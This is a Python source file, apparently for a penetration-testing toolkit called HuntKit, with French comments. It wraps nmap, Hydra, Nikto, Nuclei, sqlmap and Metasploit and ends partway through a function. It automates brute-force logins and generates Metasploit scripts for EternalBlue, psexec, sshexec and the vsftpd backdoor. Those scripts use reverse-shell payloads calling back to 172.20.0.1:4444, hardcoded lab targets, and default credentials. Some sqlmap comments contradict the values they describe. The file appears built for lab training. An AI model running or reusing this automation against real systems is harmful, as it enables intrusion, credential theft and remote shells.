import os
import subprocess
import json
import logging
import re
import tempfile
import time
from typing import Dict, List, Optional, Any
from datetime import datetime

logger = logging.getLogger(__name__)

class HuntKitToolsManager:
    """Gestionnaire centralisé pour tous les outils HuntKit"""
    
    def __init__(self):
        self.tools_dir = os.getenv('TOOLS_DIR', '/opt')
        self.wordlists_dir = os.getenv('WORDLISTS_DIR', '/usr/share/wordlists')
        
        # Chemins des outils
        self.tools_paths = {
            'nmap': '/usr/bin/nmap',
            'hydra': '/usr/local/bin/hydra',
            'nikto': '/usr/local/bin/nikto',
            'nuclei': '/usr/local/bin/nuclei',
            'sqlmap': '/usr/local/bin/sqlmap',
            'msfconsole': '/usr/bin/msfconsole',
            'msfrun': '/usr/local/bin/msfrun'
        }
        
        # Wordlists communes
        self.wordlists = {
            'passwords': f'{self.wordlists_dir}/rockyou.txt',
            'common_passwords': f'{self.wordlists_dir}/top1000-passwords.txt',
            'common_dirs': f'{self.wordlists_dir}/common.txt'
        }
    

    def _find_metasploit_console(self) -> Optional[str]:
        """Trouve msfconsole dans votre installation existante"""
        import glob
        
        # Chemins possibles selon votre installation
        possible_paths = [
            '/opt/metasploit-framework/embedded/framework/msfconsole',  # Installation Rapid7
            '/opt/metasploit*/msfconsole',  # Pattern générique
            '/opt/metasploit-framework/msfconsole',  # Alternative
            '/usr/local/bin/msfconsole',   # Installation locale
            '/usr/bin/msfconsole'          # Installation système
        ]
        
        for path_pattern in possible_paths:
            if '*' in path_pattern:
                # Utiliser glob pour les patterns
                matches = glob.glob(path_pattern)
                for match in matches:
                    if os.path.isfile(match) and os.access(match, os.X_OK):
                        logger.info(f"🎯 msfconsole trouvé: {match}")
                        return match
            else:
                # Chemin direct
                if os.path.isfile(path_pattern) and os.access(path_pattern, os.X_OK):
                    logger.info(f"🎯 msfconsole trouvé: {path_pattern}")
                    return path_pattern
        
        # Fallback avec which
        try:
            result = subprocess.run(['which', 'msfconsole'], 
                                  capture_output=True, text=True, timeout=5)
            if result.returncode == 0 and result.stdout.strip():
                path = result.stdout.strip()
                logger.info(f"🎯 msfconsole trouvé via which: {path}")
                return path
        except:
            pass
        
        logger.warning("⚠️ msfconsole non trouvé - Metasploit peut ne pas être disponible")
        return None

    def verify_tools(self) -> Dict[str, bool]:
        """Vérifie que tous les outils sont disponibles"""
        status = {}
        for tool, path in self.tools_paths.items():
            status[tool] = os.path.exists(path) or self._which(tool) is not None
        return status
    
    def _which(self, program: str) -> Optional[str]:
        """Équivalent de 'which' en Python"""
        for path in os.environ["PATH"].split(os.pathsep):
            exe_file = os.path.join(path, program)
            if os.path.isfile(exe_file) and os.access(exe_file, os.X_OK):
                return exe_file
        return None

    
    def get_metasploit_info(self) -> Dict[str, Any]:
        """Informations détaillées sur l'installation Metasploit"""
        msf_path = self.tools_paths.get('msfconsole')
        
        if not msf_path:
            return {
                'installed': False,
                'error': 'msfconsole non trouvé',
                'searched_paths': [
                    '/opt/metasploit-framework/embedded/framework/msfconsole',
                    '/opt/metasploit*/msfconsole',
                    '/usr/local/bin/msfconsole',
                    '/usr/bin/msfconsole'
                ]
            }
        
        try:
            # Test de version
            result = subprocess.run([msf_path, '-v'], 
                                  capture_output=True, text=True, timeout=15)
            
            if result.returncode == 0:
                version = result.stdout.strip()
                installation_type = self._detect_installation_type(msf_path)
                
                return {
                    'installed': True,
                    'path': msf_path,
                    'version': version,
                    'installation_type': installation_type,
                    'working': True
                }
            else:
                return {
                    'installed': True,
                    'path': msf_path,
                    'working': False,
                    'error': result.stderr or 'Erreur lors du test de version'
                }
                
        except Exception as e:
            return {
                'installed': True,
                'path': msf_path,
                'working': False,
                'error': str(e)
            }
    
    def _detect_installation_type(self, msf_path: str) -> str:
        """Détecte le type d'installation Metasploit"""
        if '/opt/metasploit-framework' in msf_path:
            return 'rapid7_installer'  # Votre installation actuelle
        elif '/usr/bin' in msf_path:
            return 'package_manager'
        elif '/usr/local' in msf_path:
            return 'manual_install'
        else:
            return 'custom'
    

    
    def _run_command(self, command: List[str], timeout: int = 300, input_data: str = None) -> Dict[str, Any]:
        """Exécute une commande et retourne le résultat - VERSION AMÉLIORÉE"""
        try:
            logger.info(f"🔧 Exécution: {' '.join(command)}")
            
            result = subprocess.run(
                command,
                capture_output=True,
                text=True,
                timeout=timeout,
                input=input_data,
                check=False  # Ne pas lever d'exception sur code de retour non-zéro
            )
            
            logger.info(f"📊 Code retour: {result.returncode}")
            logger.debug(f"📝 Stdout ({len(result.stdout)} chars): {result.stdout[:200]}...")
            logger.debug(f"📝 Stderr ({len(result.stderr)} chars): {result.stderr[:200]}...")
            
            return {
                'success': result.returncode == 0,
                'returncode': result.returncode,
                'stdout': result.stdout,
                'stderr': result.stderr,
                'command': ' '.join(command)
            }
            
        except subprocess.TimeoutExpired:
            logger.error(f"⏰ Timeout ({timeout}s) pour: {' '.join(command)}")
            return {
                'success': False,
                'returncode': -1,
                'stdout': '',
                'stderr': f'Timeout après {timeout} secondes',
                'command': ' '.join(command)
            }
        except Exception as e:
            logger.error(f"❌ Erreur exécution: {e}")
            return {
                'success': False,
                'returncode': -1,
                'stdout': '',
                'stderr': str(e),
                'command': ' '.join(command)
            }


class NmapWrapper:
    """Wrapper pour Nmap"""
    
    def __init__(self, tools_manager: HuntKitToolsManager):
        self.tools = tools_manager
    
    def ping_scan(self, target: str, timeout: int = 300) -> Dict[str, Any]:
        """Scan de découverte (ping scan)"""
        command = ['nmap', '-sn', '-PE', '-PP', '-PM', target]
        result = self.tools._run_command(command, timeout)
        
        if result['success']:
            result['parsed'] = self._parse_ping_scan(result['stdout'])
        
        return result
    
    def port_scan(self, target: str, ports: str = '1-1000', timeout: int = 600) -> Dict[str, Any]:
        """Scan de ports"""
        command = ['nmap', '-sS', '-p', ports, target]
        result = self.tools._run_command(command, timeout)
        
        if result['success']:
            result['parsed'] = self._parse_port_scan(result['stdout'])
        
        return result
    
    def service_scan(self, target: str, ports: str = '22,80,443', timeout: int = 900) -> Dict[str, Any]:
        """Scan des services et versions"""
        command = ['nmap', '-sV', '-sC', '-p', ports, target]
        result = self.tools._run_command(command, timeout)
        
        if result['success']:
            result['parsed'] = self._parse_service_scan(result['stdout'])
        
        return result
    
    def _parse_ping_scan(self, output: str) -> Dict[str, Any]:
        """Parse la sortie d'un ping scan"""
        hosts = []
        lines = output.split('\n')
        
        for line in lines:
            if 'Nmap scan report for' in line:
                # Extraire l'IP/hostname
                parts = line.split('Nmap scan report for ')
                if len(parts) > 1:
                    host_info = parts[1].strip()
                    hosts.append({'host': host_info, 'status': 'up'})
        
        return {
            'hosts_found': hosts,
            'total_hosts': len(hosts)
        }
    
    def _parse_port_scan(self, output: str) -> Dict[str, Any]:
        """Parse la sortie d'un port scan"""
        return {'raw_output': output}  # Parsing détaillé à implémenter selon besoins
    
    def _parse_service_scan(self, output: str) -> Dict[str, Any]:
        """Parse la sortie d'un service scan"""
        return {'raw_output': output}  # Parsing détaillé à implémenter selon besoins


class HydraWrapper:
    """Wrapper pour Hydra"""
    
    def __init__(self, tools_manager: HuntKitToolsManager):
        self.tools = tools_manager
    
    def brute_force(self, target: str, service: str, username: str = None, 
                   userlist: str = None, password: str = None, 
                   passwordlist: str = None, timeout: int = 1800) -> Dict[str, Any]:
        """Attaque par force brute - VERSION CORRIGÉE POUR HTTP"""
        
        command = ['hydra']
        
        # Utilisateur(s)
        if username:
            command.extend(['-l', username])
        elif userlist:
            command.extend(['-L', userlist])
        else:
            command.extend(['-l', 'admin'])  # Valeur par défaut
        
        # Mot(s) de passe
        if password:
            command.extend(['-p', password])
        elif passwordlist:
            command.extend(['-P', passwordlist])
        else:
            # Utiliser la wordlist par défaut
            default_wordlist = self.tools.wordlists.get('common_passwords')
            if os.path.exists(default_wordlist):
                command.extend(['-P', default_wordlist])
            else:
                command.extend(['-p', 'password'])  # Fallback
        
        # ✅ CORRECTION PRINCIPALE : Gestion spécifique des services HTTP
        if service == 'http-post-form':
            # Configuration spécifique pour DVWA ou formulaires web
            if '172.20.0.' in target or '8080' in str(target):
                # DVWA spécifique
                form_params = "/login.php:username=^USER^&password=^PASS^:Login failed"
                command.extend([target, 'http-post-form', form_params])
            elif 'login' in target.lower() or 'dvwa' in target.lower():
                # Autres applications web avec login
                form_params = "/login.php:username=^USER^&password=^PASS^:incorrect"
                command.extend([f'{target}', 'http-post-form', form_params])
            else:
                # Configuration générique pour formulaire web
                form_params = "/login:username=^USER^&password=^PASS^:failed"
                command.extend([f'{target}', 'http-post-form', form_params])
        
        elif service == 'http-get':
            # HTTP Basic Auth
            command.extend([target, 'http-get', '/'])
        
        else:
            # Services standards (SSH, FTP, etc.)
            command.extend([target, service])
        
        # Options additionnelles
        command.extend(['-t', '4', '-f'])  # 4 threads, arrêt à la première trouvaille
        
        # ✅ AMÉLIORATION : Log de la commande pour debug
        logger.info(f"🔨 Commande Hydra: {' '.join(command)}")
        
        result = self.tools._run_command(command, timeout)
        
        # ✅ AMÉLIORATION : Log du résultat pour debug
        if not result['success']:
            logger.error(f"❌ Hydra stderr: {result['stderr']}")
            logger.error(f"❌ Hydra stdout: {result['stdout']}")
        
        if result['success']:
            result['parsed'] = self._parse_hydra_output(result['stdout'])
        
        return result

    def detect_login_form(self, target: str) -> str:
        """Détecte automatiquement la configuration du formulaire de login"""
        try:
            import requests
            
            # Essayer de récupérer la page de login
            if not target.startswith('http'):
                test_urls = [
                    f"http://{target}/login.php",
                    f"http://{target}/login",
                    f"http://{target}/admin",
                    f"http://{target}"
                ]
            else:
                test_urls = [target]
            
            for url in test_urls:
                try:
                    response = requests.get(url, timeout=5)
                    if response.status_code == 200:
                        content = response.text.lower()
                        
                        # Détecter DVWA
                        if 'dvwa' in content or 'damn vulnerable' in content:
                            return "/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"
                        
                        # Détecter d'autres formulaires
                        if 'password' in content and 'username' in content:
                            return "/login:username=^USER^&password=^PASS^:incorrect"
                            
                except:
                    continue
            
            # Fallback générique
            return "/login:username=^USER^&password=^PASS^:failed"
            
        except Exception as e:
            logger.warning(f"⚠️ Impossible de détecter le formulaire: {e}")
            return "/login:username=^USER^&password=^PASS^:failed"

    def _parse_hydra_output(self, output: str) -> Dict[str, Any]:
        """Parse la sortie de Hydra - VERSION AMÉLIORÉE"""
        found_credentials = []
        lines = output.split('\n')
        
        for line in lines:
            line = line.strip()
            
            # Format classique: [service][port] host: login: password:
            if '[' in line and '] ' in line and 'login:' in line and 'password:' in line:
                try:
                    # Extraire après le premier '] '
                    parts = line.split('] ', 1)[1]
                    
                    if 'login:' in parts and 'password:' in parts:
                        # Split sur 'login:' puis 'password:'
                        login_part = parts.split('login:')[1].split('password:')[0].strip()
                        password_part = parts.split('password:')[1].strip()
                        
                        found_credentials.append({
                            'login': login_part,
                            'password': password_part,
                            'service': self._extract_service_from_line(line)
                        })
                        
                except Exception as e:
                    logger.debug(f"Erreur parsing ligne Hydra: {line} - {e}")
                    continue
            
            # Format alternatif pour HTTP
            elif 'valid password found' in line.lower():
                # Format: "login: admin password: password"
                if 'login:' in line and 'password:' in line:
                    try:
                        import re
                        login_match = re.search(r'login:\s*(\S+)', line)
                        password_match = re.search(r'password:\s*(\S+)', line)
                        
                        if login_match and password_match:
                            found_credentials.append({
                                'login': login_match.group(1),
                                'password': password_match.group(1),
                                'service': 'http'
                            })
                    except:
                        continue
        
        return {
            'credentials_found': found_credentials,
            'total_found': len(found_credentials),
            'raw_output': output
        }

    def _extract_service_from_line(self, line: str) -> str:
        """Extrait le service de la ligne de résultat Hydra"""
        if '[http-post-form]' in line:
            return 'http-post-form'
        elif '[ssh]' in line:
            return 'ssh'
        elif '[ftp]' in line:
            return 'ftp'
        else:
            return 'unknown'


class NiktoWrapper:
    """Wrapper pour Nikto - VERSION CORRIGÉE"""
    
    def __init__(self, tools_manager: HuntKitToolsManager):
        self.tools = tools_manager
    
    def web_scan(self, target: str, port: int = 80, ssl: bool = False, 
                timeout: int = 1800) -> Dict[str, Any]:
        """Scan de vulnérabilités web - VERSION CORRIGÉE"""
        
        protocol = 'https' if ssl else 'http'
        default_port = 443 if ssl else 80
        
        if port == default_port:
            url = f"{protocol}://{target}"
        else:
            url = f"{protocol}://{target}:{port}"
        
        # 🔥 CORRECTION: Retirer -Format txt qui cause l'erreur
        command = [
            'nikto',
            '-h', url,
            '-timeout', '15',
            '-maxtime', '600',
            '-nointeractive'
        ]
        
        logger.info(f"🕷️ Commande Nikto: {' '.join(command)}")
        
        result = self.tools._run_command(command, timeout)
        
        # Debug : afficher stderr si erreur
        if not result['success']:
            logger.error(f"❌ Nikto stderr: {result['stderr']}")
        
        result['parsed'] = self._parse_nikto_output(result['stdout'])
        
        return result
    
    def _parse_nikto_output(self, output: str) -> Dict[str, Any]:
        """Parse la sortie de Nikto - VERSION AMÉLIORÉE"""
        vulnerabilities = []
        lines = output.split('\n')
        
        logger.info(f"📝 Nikto: {len(lines)} lignes à analyser")
        
        for line in lines:
            line = line.strip()
            
            # Lignes qui commencent par + sont des vulnérabilités/informations
            if line.startswith('+ ') and len(line) > 2:
                vuln = line[2:].strip()  # Retirer '+ '
                # Filtrer les lignes d'info non importantes
                if vuln and not any(skip in vuln.lower() for skip in [
                    'target ip:', 'target hostname:', 'target port:', 'start time:'
                ]):
                    vulnerabilities.append(vuln)
                    logger.debug(f"🕷️ Vulnérabilité Nikto: {vuln[:100]}...")
        
        logger.info(f"🕷️ Nikto: {len(vulnerabilities)} vulnérabilités trouvées")
        
        return {
            'vulnerabilities': vulnerabilities,
            'total_vulnerabilities': len(vulnerabilities)
        }


class NucleiWrapper:
    """Wrapper pour Nuclei - VERSION CORRIGÉE"""
    
    def __init__(self, tools_manager: HuntKitToolsManager):
        self.tools = tools_manager
    
    def vulnerability_scan(self, target: str, templates: str = None, 
                          severity: str = None, timeout: int = 1800) -> Dict[str, Any]:
        """Scan de vulnérabilités avec Nuclei - VERSION CORRIGÉE"""
        
        # 🔥 CORRECTION: Utiliser -jsonl au lieu de -json
        command = ['nuclei', '-u', target, '-jsonl', '-silent']
        
        # Templates
        if templates:
            command.extend(['-t', templates])
        
        # Sévérité
        if severity:
            command.extend(['-severity', severity])
        else:
            command.extend(['-severity', 'medium,high,critical'])
        
        # Options corrigées
        command.extend([
            '-timeout', '10',
            '-retries', '1',
            '-no-color'
        ])
        
        logger.info(f"🎯 Commande Nuclei: {' '.join(command)}")
        
        result = self.tools._run_command(command, timeout)
        
        if result['returncode'] != 0:
            logger.warning(f"⚠️ Nuclei stderr: {result['stderr']}")
        
        result['parsed'] = self._parse_nuclei_output(result['stdout'])
        
        return result
    
    def _parse_nuclei_output(self, output: str) -> Dict[str, Any]:
        """Parse la sortie JSON de Nuclei - VERSION AMÉLIORÉE"""
        vulnerabilities = []
        lines = output.strip().split('\n')
        
        logger.info(f"📝 Nuclei: {len(lines)} lignes à parser")
        
        for line_num, line in enumerate(lines, 1):
            line = line.strip()
            if not line:
                continue
                
            try:
                # Tenter de parser chaque ligne comme JSON
                vuln_data = json.loads(line)
                vulnerabilities.append(vuln_data)
                logger.debug(f"✅ Ligne {line_num}: {vuln_data.get('template-id', 'unknown')}")
                
            except json.JSONDecodeError as e:
                # Si ce n'est pas du JSON, peut-être un message d'erreur ou d'info
                logger.debug(f"⚠️ Ligne {line_num} non-JSON: {line[:50]}...")
                continue
        
        logger.info(f"🎯 Nuclei: {len(vulnerabilities)} vulnérabilités trouvées")
        
        return {
            'vulnerabilities': vulnerabilities,
            'total_vulnerabilities': len(vulnerabilities),
            'raw_lines': len(lines)
        }


class SQLMapWrapper:
    """Wrapper pour SQLMap - VERSION CORRIGÉE"""
    
    def __init__(self, tools_manager: HuntKitToolsManager):
        self.tools = tools_manager
    
    def sql_injection_scan(self, target: str, data: str = None, 
                          cookie: str = None, timeout: int = 1800) -> Dict[str, Any]:
        """Scan d'injection SQL - VERSION CORRIGÉE POUR DVWA"""
        
        # 🔥 CORRECTION: URL spécifique DVWA avec authentification
        if '172.20.0.4' in target:
            # DVWA nécessite d'être connecté
            if 'vulnerabilities' not in target:
                test_url = f"{target.rstrip('/')}/vulnerabilities/sqli/?id=1&Submit=Submit"
            else:
                test_url = target if '?' in target else f"{target}?id=1&Submit=Submit"
            
            # Cookie avec session et sécurité basse
            dvwa_cookie = "security=low; PHPSESSID=dvwatest123"
        else:
            test_url = target if '?' in target else f"{target.rstrip('/')}?id=1&Submit=Submit"
            dvwa_cookie = cookie
        
        command = ['sqlmap', '-u', test_url, '--batch', '--random-agent']
        
        # Cookie DVWA obligatoire
        if dvwa_cookie:
            command.extend(['--cookie', dvwa_cookie])
        
        # 🔥 CORRECTION: Paramètres plus agressifs pour DVWA
        command.extend([
            '--level=1',           # Niveau maximum
            '--risk=1',            # Risque maximum
            '--timeout=5',         
            '--retries=1',         
            '--technique=BEUSTQ',  # Toutes les techniques
            '--flush-session',     
            '--fresh-queries',
            '--forms',             # Détecter les formulaires
            '--crawl=2'            # Explorer 2 niveaux
        ])
        
        logger.info(f"💉 Commande SQLMap: {' '.join(command)}")
        logger.info(f"💉 URL testée: {test_url}")
        
        result = self.tools._run_command(command, timeout)
        
        # Toujours parser même si pas d'injection trouvée
        result['parsed'] = self._parse_sqlmap_output(result['stdout'] + result['stderr'])
        
        return result
    
    def _parse_sqlmap_output(self, output: str) -> Dict[str, Any]:
        """Parse la sortie de SQLMap - VERSION AMÉLIORÉE"""
        
        # Rechercher les indicateurs d'injection
        vulnerable_params = []
        injection_types = []
        
        lines = output.split('\n')
        logger.info(f"📝 SQLMap: {len(lines)} lignes à analyser")
        
        for line in lines:
            line_lower = line.lower()
            
            # Détection d'injections
            if 'parameter' in line_lower and 'vulnerable' in line_lower:
                vulnerable_params.append(line.strip())
                logger.info(f"🚨 Paramètre vulnérable: {line.strip()}")
            
            # Types d'injection détectés
            if 'type:' in line_lower and any(x in line_lower for x in ['boolean', 'time', 'union', 'error', 'stacked']):
                injection_types.append(line.strip())
                logger.info(f"💉 Type d'injection: {line.strip()}")
            
            # Indicateurs de succès plus larges
            success_indicators = [
                'sqlmap identified',
                'injection point',
                'database management system',
                'back-end dbms',
                'appears to be',
                'seems to be',
                'might be injectable'
            ]
            
            if any(keyword in line_lower for keyword in success_indicators):
                logger.info(f"✅ Indicateur positif: {line.strip()}")
                if 'appears to be' in line_lower or 'seems to be' in line_lower:
                    vulnerable_params.append(f"Détection: {line.strip()}")
        
        # Analyser le niveau de confiance
        injection_found = len(vulnerable_params) > 0 or len(injection_types) > 0
        
        logger.info(f"💉 SQLMap résultat: injection_found={injection_found}, vulns={len(vulnerable_params)}")
        
        return {
            'vulnerable_parameters': vulnerable_params,
            'injection_types': injection_types,
            'injection_found': injection_found,
            'raw_analysis': f"Analysé {len(lines)} lignes, trouvé {len(vulnerable_params)} indicateurs"
        }


# ===== NOUVEAU : WRAPPER METASPLOIT =====
class MetasploitWrapper:
    """Wrapper pour Metasploit Framework - Exécution non-interactive"""
    
    def __init__(self, tools_manager: HuntKitToolsManager):
        self.tools = tools_manager
        self.msf_path = '/usr/bin/msfconsole'
        self.msfrun_path = '/usr/local/bin/msfrun'
        
        # Modules d'exploitation courants
        self.common_exploits = {
            'ssh': 'auxiliary/scanner/ssh/ssh_login',
            'ftp': 'auxiliary/scanner/ftp/ftp_login', 
            'smb': 'auxiliary/scanner/smb/smb_login',
            'http': 'auxiliary/scanner/http/dir_scanner',
            'mysql': 'auxiliary/scanner/mysql/mysql_login',
            'postgresql': 'auxiliary/scanner/postgres/postgres_login',
            'telnet': 'auxiliary/scanner/telnet/telnet_login',
            'vnc': 'auxiliary/scanner/vnc/vnc_login'
        }
        
        # Payloads courants
        self.common_payloads = {
            'linux': 'linux/x64/meterpreter/reverse_tcp',
            'windows': 'windows/meterpreter/reverse_tcp',
            'php': 'php/meterpreter_reverse_tcp',
            'java': 'java/meterpreter/reverse_tcp'
        }
    
    def test_metasploit_availability(self) -> Dict[str, Any]:
        """Teste la disponibilité de Metasploit"""
        try:
            # Test simple : version de msfconsole
            result = self.tools._run_command([self.msf_path, '-v'], timeout=30)
            
            if result['success']:
                version_info = result['stdout'].strip()
                return {
                    'available': True,
                    'version': version_info,
                    'path': self.msf_path
                }
            else:
                return {
                    'available': False,
                    'error': result['stderr'],
                    'path': self.msf_path
                }
                
        except Exception as e:
            logger.error(f"❌ Erreur test Metasploit: {e}")
            return {
                'available': False,
                'error': str(e),
                'path': self.msf_path
            }
    
    def run_exploit_module(self, target: str, port: int, exploit_module: str, 
                          options: Dict = None, timeout: int = 300) -> Dict[str, Any]:
        """Lance un module d'exploitation Metasploit - VERSION AMÉLIORÉE"""
        try:
            logger.info(f"🎯 Lancement exploit: {exploit_module} sur {target}:{port}")
            
            # ✅ CREDENTIALS PAR DÉFAUT POUR METASPLOITABLE 2
            enhanced_options = options.copy() if options else {}
            
            # Ajouter des credentials par défaut si pas spécifiés
            if 'ssh' in exploit_module.lower() and 'sshexec' in exploit_module:
                if 'USERNAME' not in enhanced_options:
                    enhanced_options['USERNAME'] = 'msfadmin'
                if 'PASSWORD' not in enhanced_options:
                    enhanced_options['PASSWORD'] = 'msfadmin'
            
            # Créer le script de commandes Metasploit
            commands = self._build_exploit_script(target, port, exploit_module, enhanced_options)
            
            # Écrire dans un fichier temporaire
            with tempfile.NamedTemporaryFile(mode='w', suffix='.rc', delete=False) as f:
                f.write(commands)
                script_path = f.name
            
            try:
                # Exécuter avec msfconsole en mode resource
                command = [self.msf_path, '-q', '-r', script_path]
                result = self.tools._run_command(command, timeout)
                
                # Parser le résultat
                parsed_result = self._parse_exploit_output(result['stdout'], exploit_module)
                
                return {
                    'success': True,
                    'exploit_module': exploit_module,
                    'target': f"{target}:{port}",
                    'raw_output': result['stdout'],
                    'parsed_result': parsed_result,
                    'command_used': ' '.join(command),
                    'credentials_used': f"{enhanced_options.get('USERNAME', 'N/A')}:{enhanced_options.get('PASSWORD', 'N/A')}"
                }
                
            finally:
                # Nettoyer le fichier temporaire
                try:
                    os.unlink(script_path)
                except:
                    pass
                    
        except Exception as e:
            logger.error(f"❌ Erreur exploit Metasploit: {e}")
            return {
                'success': False,
                'error': str(e),
                'exploit_module': exploit_module,
                'target': f"{target}:{port}"
            }
    
    def run_auxiliary_scan(self, target: str, port: int, service: str, 
                          options: Dict = None, timeout: int = 300) -> Dict[str, Any]:
        """Lance un module auxiliaire (scanner) Metasploit"""
        try:
            # Sélectionner le module approprié selon le service
            if service.lower() in self.common_exploits:
                module = self.common_exploits[service.lower()]
            else:
                # Module générique de scan de ports
                module = 'auxiliary/scanner/portscan/tcp'
            
            logger.info(f"🔍 Scan auxiliaire: {module} sur {target}:{port}")
            
            # Construire le script
            commands = self._build_auxiliary_script(target, port, module, options or {})
            
            # Exécuter
            with tempfile.NamedTemporaryFile(mode='w', suffix='.rc', delete=False) as f:
                f.write(commands)
                script_path = f.name
            
            try:
                command = [self.msf_path, '-q', '-r', script_path]
                result = self.tools._run_command(command, timeout)
                
                parsed_result = self._parse_auxiliary_output(result['stdout'], module)
                
                return {
                    'success': True,
                    'module': module,
                    'target': f"{target}:{port}",
                    'service': service,
                    'raw_output': result['stdout'],
                    'parsed_result': parsed_result
                }
                
            finally:
                try:
                    os.unlink(script_path)
                except:
                    pass
                    
        except Exception as e:
            logger.error(f"❌ Erreur scan auxiliaire: {e}")
            return {
                'success': False,
                'error': str(e),
                'target': f"{target}:{port}",
                'service': service
            }
    
    def search_exploits(self, service: str = None, platform: str = None, 
                       cve: str = None) -> Dict[str, Any]:
        """Recherche d'exploits dans la base Metasploit"""
        try:
            search_terms = []
            
            if service:
                search_terms.append(f"type:exploit {service}")
            if platform:
                search_terms.append(f"platform:{platform}")
            if cve:
                search_terms.append(f"cve:{cve}")
            
            search_query = " ".join(search_terms) if search_terms else "type:exploit"
            
            # Créer le script de recherche
            commands = f"""
search {search_query}
exit
"""
            
            with tempfile.NamedTemporaryFile(mode='w', suffix='.rc', delete=False) as f:
                f.write(commands)
                script_path = f.name
            
            try:
                command = [self.msf_path, '-q', '-r', script_path]
                result = self.tools._run_command(command, timeout=60)
                
                exploits = self._parse_search_output(result['stdout'])
                
                return {
                    'success': True,
                    'search_query': search_query,
                    'exploits_found': exploits,
                    'total_results': len(exploits)
                }
                
            finally:
                try:
                    os.unlink(script_path)
                except:
                    pass
                    
        except Exception as e:
            logger.error(f"❌ Erreur recherche exploits: {e}")
            return {
                'success': False,
                'error': str(e),
                'search_query': search_query if 'search_query' in locals() else 'N/A'
            }

    def _build_exploit_script(self, target: str, port: int, exploit_module: str, options: Dict) -> str:
        """Construit un script Metasploit pour exploitation - VERSION CORRIGÉE"""
        script = f"""
use {exploit_module}
set RHOSTS {target}
set RPORT {port}
"""
        
        # ✅ GESTION SPÉCIALE POUR SSH EXPLOITS
        if 'ssh' in exploit_module.lower():
            # Pour exploit/multi/ssh/sshexec - credentials requis
            if 'sshexec' in exploit_module:
                script += f"set USERNAME {options.get('USERNAME', 'msfadmin')}\n"
                script += f"set PASSWORD {options.get('PASSWORD', 'msfadmin')}\n"
                
                # Payload par défaut pour SSH
                payload = options.get('PAYLOAD', 'linux/x64/shell/reverse_tcp')
                script += f"set PAYLOAD {payload}\n"
                
                # LHOST et LPORT pour reverse shell
                script += f"set LHOST {options.get('LHOST', '172.20.0.1')}\n"  # IP du conteneur
                script += f"set LPORT {options.get('LPORT', '4444')}\n"
        
        # ✅ GESTION POUR SMB EXPLOITS
        elif 'smb' in exploit_module.lower():
            if 'eternalblue' in exploit_module or 'ms17_010' in exploit_module:
                payload = options.get('PAYLOAD', 'windows/x64/meterpreter/reverse_tcp')
                script += f"set PAYLOAD {payload}\n"
                script += f"set LHOST {options.get('LHOST', '172.20.0.1')}\n"
                script += f"set LPORT {options.get('LPORT', '4444')}\n"
            elif 'psexec' in exploit_module:
                script += f"set SMBUser {options.get('USERNAME', 'administrator')}\n"
                script += f"set SMBPass {options.get('PASSWORD', 'password')}\n"
        
        # ✅ GESTION POUR FTP EXPLOITS  
        elif 'ftp' in exploit_module.lower():
            if 'vsftpd' in exploit_module:
                # VSFTPD backdoor n'a pas besoin de credentials
                payload = options.get('PAYLOAD', 'cmd/unix/interact')
                script += f"set PAYLOAD {payload}\n"
        
        # Ajouter les options personnalisées
        for key, value in options.items():
            if key.upper() not in ['USERNAME', 'PASSWORD', 'PAYLOAD', 'LHOST', 'LPORT']:
                script += f"set {key.upper()} {value}\n"
        
        # ✅ COMMANDES D'EXPLOITATION
        script += """
check
exploit -z
sessions -l
exit
"""
        return script
    
    def _build_auxiliary_script(self, target: str, port: int, module: str, options: Dict) -> str:
        """Construit un script pour modules auxiliaires - VERSION CORRIGÉE"""
        script = f"""
    use {module}
    set RHOSTS {target}
    set RPORT {port}
    """
    
        # Options communes pour scanners
        script += "set THREADS 10\n"
        script += "set VERBOSE true\n"
    
        # ✅ CORRECTION : Filtrer les options valides pour les modules auxiliaires
        valid_auxiliary_options = {
            'USERNAME', 'PASSWORD', 'USER_FILE', 'PASS_FILE', 'USERPASS_FILE',
            'STOP_ON_SUCCESS', 'BRUTEFORCE_SPEED', 'DB_ALL_CREDS', 'DB_ALL_PASS',
            'DB_ALL_USERS', 'BLANK_PASSWORDS', 'USER_AS_PASS', 'THREADS', 'VERBOSE'
        }
    
        # Ajouter seulement les options valides
        for key, value in options.items():
            key_upper = key.upper()
            if key_upper in valid_auxiliary_options:
                script += f"set {key_upper} {value}\n"
            # Ignorer les options non-valides comme MODE, PAYLOAD, LHOST, LPORT
    
        script += """
    run
    exit
    """
        return script
    
    def _parse_exploit_output(self, output: str, module: str) -> Dict[str, Any]:
        """Parse la sortie d'un exploit Metasploit"""
        result = {
            'exploit_attempted': True,
            'sessions_opened': 0,
            'vulnerabilities_found': [],
            'errors': [],
            'status': 'unknown'
        }
        
        lines = output.split('\n')
        
        for line in lines:
            line_lower = line.lower()
            
            # Détection de sessions ouvertes
            if 'session' in line_lower and ('opened' in line_lower or 'created' in line_lower):
                result['sessions_opened'] += 1
                result['status'] = 'exploited'
            
            # Détection de vulnérabilités
            if any(keyword in line_lower for keyword in ['vulnerable', 'exploit completed', 'shell opened']):
                result['vulnerabilities_found'].append(line.strip())
                result['status'] = 'vulnerable'
            
            # Détection d'erreurs
            if any(keyword in line_lower for keyword in ['error', 'failed', 'unable to']):
                result['errors'].append(line.strip())
            
            # Détection d'échec d'exploitation
            if any(keyword in line_lower for keyword in ['exploit failed', 'not vulnerable', 'target is not']):
                result['status'] = 'not_vulnerable'
        
        # Statut par défaut si pas de sessions mais pas d'erreurs
        if result['status'] == 'unknown' and not result['errors']:
            result['status'] = 'completed'
        
        return result
    
    def _parse_auxiliary_output(self, output: str, module: str) -> Dict[str, Any]:
        """Parse la sortie d'un module auxiliaire"""
        result = {
            'scan_completed': True,
            'credentials_found': [],
            'hosts_discovered': [],
            'vulnerabilities': [],
            'errors': []
        }
        
        lines = output.split('\n')
        
        for line in lines:
            line_lower = line.lower()
            
            # Détection de credentials
            if any(keyword in line_lower for keyword in ['login successful', 'valid credentials', 'success:']):
                # Extraire les credentials si possible
                cred_match = re.search(r'(\w+):(\w+)', line)
                if cred_match:
                    result['credentials_found'].append({
                        'username': cred_match.group(1),
                        'password': cred_match.group(2),
                        'service': module.split('/')[-1] if '/' in module else 'unknown'
                    })
            
            # Détection d'hôtes
            if 'responding' in line_lower or 'alive' in line_lower:
                host_match = re.search(r'(\d+\.\d+\.\d+\.\d+)', line)
                if host_match:
                    result['hosts_discovered'].append(host_match.group(1))
            
            # Erreurs
            if any(keyword in line_lower for keyword in ['error', 'failed', 'timeout']):
                result['errors'].append(line.strip())
        
        return result
    
    def _parse_search_output(self, output: str) -> List[Dict[str, str]]:
